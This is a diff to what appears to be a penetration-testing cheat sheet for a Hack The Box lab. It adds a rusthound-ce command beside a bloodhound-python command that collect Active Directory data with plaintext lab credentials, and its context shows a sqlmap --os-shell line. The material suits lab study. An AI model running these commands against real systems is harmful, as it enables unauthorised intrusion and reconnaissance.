@@ -759,8 +759,11 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 ## bloodhound 
 
 ```
-# run bloodhound
+# run bloodhound to colect data 
 bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c all -ns 10.10.11.69
+
+#  another run bloodhound ( recomment becase can colllect all certtemplate ) 
+rusthound-ce -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -z 
 
 # run neo4j
 sudo neo4j console
